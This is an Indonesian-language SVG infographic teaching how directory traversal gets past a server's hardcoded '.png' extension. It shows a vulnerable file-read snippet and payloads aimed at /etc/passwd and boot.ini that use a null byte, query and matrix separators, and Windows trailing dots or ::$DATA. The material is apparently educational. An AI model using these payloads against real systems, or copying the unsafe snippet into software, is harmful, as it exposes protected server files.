<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" height="100%">
  <defs>
    <!-- Background Gradient -->
    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#090D16"/>
      <stop offset="50%" stop-color="#0F172A"/>
      <stop offset="100%" stop-color="#090D16"/>
    </linearGradient>

    <!-- Card Gradients -->
    <linearGradient id="cardGrad" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1E293B" stop-opacity="0.95"/>
      <stop offset="100%" stop-color="#0F172A" stop-opacity="0.95"/>
    </linearGradient>

    <linearGradient id="nullGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#431407"/>
      <stop offset="100%" stop-color="#1F0703"/>
    </linearGradient>

    <!-- Glow Filters -->
    <filter id="glowOrange" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowCyan" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowPurple" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>

    <!-- Shadow -->
    <filter id="cardShadow" x="-10%" y="-10%" width="120%" height="125%">
      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000000" flood-opacity="0.5"/>
    </filter>

    <!-- Markers -->
    <marker id="arrowOrange" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#F97316"/>
    </marker>
    <marker id="arrowCyan" markerWidth="10" markerHeight="10" refX="6" refY="3" orient="auto">
      <path d="M0,0 L0,6 L8,3 z" fill="#38BDF8"/>
    </marker>
  </defs>

  <style>
    .title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 800; fill: #F8FAFC; }
    .subtitle { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 500; fill: #94A3B8; }
    .card-title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 700; }
    .code-text { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; font-weight: 600; }
    .desc-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 12px; fill: #CBD5E1; }
    .badge { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 11px; font-weight: 700; }
  </style>

  <!-- Background Base -->
  <rect width="1080" height="560" rx="16" fill="url(#bgGrad)"/>
  <rect width="1080" height="560" rx="16" fill="none" stroke="#334155" stroke-width="1.5" stroke-opacity="0.6"/>

  <!-- Subtle Grid Pattern -->
  <g opacity="0.06" stroke="#94A3B8" stroke-width="1">
    <line x1="0" y1="80" x2="1080" y2="80"/>
    <line x1="0" y1="160" x2="1080" y2="160"/>
    <line x1="0" y1="240" x2="1080" y2="240"/>
    <line x1="0" y1="320" x2="1080" y2="320"/>
    <line x1="0" y1="400" x2="1080" y2="400"/>
    <line x1="0" y1="480" x2="1080" y2="480"/>
    <line x1="120" y1="0" x2="120" y2="560"/>
    <line x1="240" y1="0" x2="240" y2="560"/>
    <line x1="360" y1="0" x2="360" y2="560"/>
    <line x1="480" y1="0" x2="480" y2="560"/>
    <line x1="600" y1="0" x2="600" y2="560"/>
    <line x1="720" y1="0" x2="720" y2="560"/>
    <line x1="840" y1="0" x2="840" y2="560"/>
    <line x1="960" y1="0" x2="960" y2="560"/>
  </g>

  <!-- Header Section -->
  <g transform="translate(48, 44)">
    <rect x="0" y="0" width="180" height="24" rx="12" fill="#F97316" fill-opacity="0.15" stroke="#F97316" stroke-width="1"/>
    <text x="90" y="16" text-anchor="middle" class="badge" fill="#F97316">EXTENSION BYPASS TRICKS</text>
    <text x="195" y="18" class="title" font-size="20">Directory Traversal: Bypassing Hardcoded Extension</text>
    <text x="0" y="42" class="subtitle" font-size="13">Teknik memotong akhiran ekstensi paksa (.png / .php) menggunakan Null Byte (%00), Query String (?), &amp; NTFS Normalization</text>
  </g>

  <!-- ==================== LEFT CARD: THE PROBLEM (HARDCODED EXTENSION) ==================== -->
  <g transform="translate(48, 120)" filter="url(#cardShadow)">
    <rect width="320" height="400" rx="14" fill="url(#cardGrad)" stroke="#475569" stroke-width="1.5"/>
    
    <circle cx="38" cy="38" r="20" fill="#334155" stroke="#64748B" stroke-width="1.5"/>
    <path d="M30 38 H46 M38 30 V46" stroke="#94A3B8" stroke-width="2" stroke-linecap="round"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#F8FAFC">Masalah: Hardcoded Ext</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Backend otomatis menambahkan .png</text>

    <line x1="18" y1="68" x2="302" y2="68" stroke="#334155" stroke-width="1"/>

    <!-- Code Block Problem -->
    <rect x="16" y="80" width="288" height="110" rx="8" fill="#090D16" stroke="#334155" stroke-width="1"/>
    <text x="26" y="100" class="badge" fill="#FCA5A5">KODE BACKEND SERVER:</text>
    <text x="26" y="122" class="code-text" fill="#CBD5E1">const path = "/images/" +</text>
    <text x="36" y="140" class="code-text" fill="#38BDF8">  req.query.filename +</text>
    <text x="36" y="158" class="code-text" fill="#F43F5E" font-weight="700">  ".png"; // ← Hardcoded!</text>
    <text x="26" y="178" class="code-text" fill="#CBD5E1">fs.readFile(path);</text>

    <!-- Normal Attack Result -->
    <rect x="16" y="202" width="288" height="175" rx="8" fill="#450A0A" fill-opacity="0.3" stroke="#DC2626" stroke-width="1"/>
    <text x="26" y="222" class="badge" fill="#F87171">JIKA PENYERANG MENGIRIM:</text>
    <text x="26" y="244" class="code-text" fill="#FECDD3">filename=../../../etc/passwd</text>
    
    <text x="26" y="272" class="desc-text" font-size="11.5">Jalur yang dicari server menjadi:</text>
    <rect x="24" y="282" width="270" height="30" rx="4" fill="#1C1917" stroke="#7F1D1D" stroke-width="1"/>
    <text x="32" y="302" class="code-text" font-size="11" fill="#F87171">/etc/passwd.png</text>

    <text x="26" y="332" class="desc-text" font-size="11" fill="#FCA5A5">❌ GAGAL: Berkas "/etc/passwd.png" tidak ada di sistem operasi!</text>
    <text x="26" y="362" class="badge" fill="#F87171">HTTP 404: FILE NOT FOUND</text>
  </g>

  <!-- ==================== CENTER CARD: NULL BYTE INJECTION (%00) ==================== -->
  <g transform="translate(395, 120)" filter="url(#cardShadow)">
    <rect width="330" height="400" rx="14" fill="url(#nullGrad)" stroke="#F97316" stroke-width="1.5"/>
    
    <circle cx="38" cy="38" r="20" fill="#7C2D12" stroke="#F97316" stroke-width="1.5"/>
    <text x="38" y="44" text-anchor="middle" font-family="monospace" font-size="13" font-weight="900" fill="#FFEDD5">\0</text>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#FDBA74">1. Null Byte Injection (%00)</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#FED7AA">POSIX C-String Termination</text>

    <line x1="18" y1="68" x2="312" y2="68" stroke="#7C2D12" stroke-width="1"/>

    <!-- Payload Box -->
    <rect x="16" y="80" width="298" height="90" rx="8" fill="#1C1917" stroke="#9A3412" stroke-width="1"/>
    <text x="26" y="100" class="badge" fill="#FDBA74">PAYLOAD PENYERANG:</text>
    
    <rect x="22" y="110" width="284" height="26" rx="4" fill="#431407" stroke="#EA580C" stroke-width="1" filter="url(#glowOrange)"/>
    <text x="30" y="127" class="code-text" fill="#FFEDD5">filename=../../../etc/passwd<tspan fill="#FDE047" font-weight="800">%00.png</tspan></text>
    
    <text x="26" y="156" class="desc-text" font-size="11" fill="#FED7AA">Trik: %00 adalah representasi URL dari byte 0x00 (\0)</text>

    <!-- How C Runtime processes it -->
    <rect x="16" y="180" width="298" height="198" rx="8" fill="#090D16" stroke="#7C2D12" stroke-width="1"/>
    <text x="26" y="200" class="badge" fill="#F97316">PROSES DI KERNEL / C RUNTIME:</text>
    
    <text x="26" y="222" class="desc-text" font-size="11.5">1. String di memori server:</text>
    <text x="26" y="240" class="code-text" fill="#CBD5E1">"/etc/passwd\0.png"</text>

    <text x="26" y="264" class="desc-text" font-size="11.5">2. Fungsi C Filesystem (<tspan class="code-text" fill="#FDBA74">fopen/stat</tspan>):</text>
    <text x="26" y="282" class="desc-text" font-size="11" fill="#FEF08A">Membaca karakter dan berhenti saat bertemu byte <tspan font-weight="700" fill="#FFFFFF">\0</tspan>!</text>

    <rect x="24" y="296" width="280" height="34" rx="4" fill="#451A03" stroke="#F97316" stroke-width="1"/>
    <text x="32" y="318" class="code-text" fill="#34D399">Target Akhir: "/etc/passwd"</text>

    <text x="26" y="354" class="badge" fill="#34D399">✓ EKSTENSI .PNG BERHASIL DIBUANG!</text>
  </g>

  <!-- ==================== RIGHT CARD: OTHER BYPASS METHODS ==================== -->
  <g transform="translate(750, 120)" filter="url(#cardShadow)">
    <rect width="282" height="400" rx="14" fill="url(#cardGrad)" stroke="#38BDF8" stroke-width="1.5"/>
    
    <circle cx="38" cy="38" r="20" fill="#0369A1" fill-opacity="0.3" stroke="#38BDF8" stroke-width="1.5"/>
    <path d="M30 38 L36 44 L46 32" stroke="#38BDF8" stroke-width="2" fill="none" stroke-linecap="round"/>
    
    <text x="68" y="34" class="card-title" font-size="15" fill="#38BDF8">Metode Bypass Lain</text>
    <text x="68" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Teknik Alternatif Modern</text>

    <line x1="18" y1="68" x2="264" y2="68" stroke="#334155" stroke-width="1"/>

    <!-- Method 2: Query String & Fragment -->
    <rect x="14" y="80" width="254" height="88" rx="8" fill="#0F172A" stroke="#1E293B" stroke-width="1"/>
    <text x="24" y="100" class="badge" fill="#38BDF8">2. QUERY / FRAGMENT (? &amp; #):</text>
    <text x="24" y="120" class="code-text" font-size="11" fill="#BAE6FD">/etc/passwd?</text>
    <text x="24" y="136" class="desc-text" font-size="10.5" fill="#94A3B8">Ekstensi .png berubah jadi query:</text>
    <text x="24" y="152" class="code-text" font-size="10.5" fill="#FDE047">/etc/passwd?.png</text>

    <!-- Method 3: Path Parameter Matrix (Java/Spring) -->
    <rect x="14" y="176" width="254" height="88" rx="8" fill="#0F172A" stroke="#1E293B" stroke-width="1"/>
    <text x="24" y="196" class="badge" fill="#818CF8">3. MATRIX PARAMETER (JAVA/SPRING):</text>
    <text x="24" y="216" class="code-text" font-size="11" fill="#C7D2FE">/etc/passwd;.png</text>
    <text x="24" y="234" class="desc-text" font-size="10.5" fill="#94A3B8">Titik koma (;) memisahkan path</text>
    <text x="24" y="250" class="desc-text" font-size="10.5" fill="#94A3B8">dari atribut URL tambahan.</text>

    <!-- Method 4: Windows NTFS Dots & ADS -->
    <rect x="14" y="272" width="254" height="106" rx="8" fill="#0F172A" stroke="#1E293B" stroke-width="1"/>
    <text x="24" y="292" class="badge" fill="#F43F5E">4. WINDOWS TRAILING DOTS &amp; ADS:</text>
    <text x="24" y="312" class="code-text" font-size="10.5" fill="#FECDD3">..\..\boot.ini.</text>
    <text x="24" y="328" class="code-text" font-size="10.5" fill="#FECDD3">..\..\boot.ini::$DATA</text>
    <text x="24" y="348" class="desc-text" font-size="10.5" fill="#94A3B8">Windows otomatis memotong titik di akhir nama berkas.</text>
  </g>

  <!-- Connectors -->
  <path d="M 368 250 L 395 250" fill="none" stroke="#F97316" stroke-width="2" stroke-dasharray="4,4" marker-end="url(#arrowOrange)"/>
  <path d="M 725 250 L 750 250" fill="none" stroke="#38BDF8" stroke-width="2" stroke-dasharray="4,4" marker-end="url(#arrowCyan)"/>

</svg>
